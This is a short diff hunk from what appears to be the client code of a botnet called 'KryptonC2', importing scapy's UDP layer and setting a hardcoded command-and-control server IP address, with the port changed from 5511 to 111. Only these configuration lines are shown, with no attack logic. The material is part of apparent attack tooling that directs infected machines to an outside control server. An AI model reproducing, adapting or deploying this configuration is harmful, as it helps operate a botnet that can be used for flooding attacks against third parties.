@@ -12,7 +12,7 @@ from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
 KRYPTONC2_ADDRESS  = "91.92.255.28"
-KRYPTONC2_PORT     = 5511
+KRYPTONC2_PORT     = 111
 
 
 # Code -------------------------->
